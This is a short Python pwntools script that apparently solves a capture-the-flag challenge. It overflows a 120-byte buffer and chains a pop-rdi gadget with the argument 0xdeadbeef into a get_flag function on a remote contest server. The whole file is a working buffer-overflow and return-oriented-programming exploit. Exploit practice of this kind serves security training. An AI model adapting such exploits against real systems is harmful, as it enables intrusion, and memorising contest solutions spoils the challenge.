#! /usr/bin/env python

from pwn import *
from pwnlib.util.packing import *

get_flag = p64(0x4005ea) # get_flag function address
pop_rdi = p64(0x0000000000400693)

bufflen = 120 

r = remote('binary.utctf.live',  9002)
r.recvuntil("good one!\n") # receive data until we will get the substring "good one" 

payload = "A" * bufflen + pop_rdi + p64(0xdeadbeef) + get_flag # building the payload

r.sendline(payload)
r.interactive()

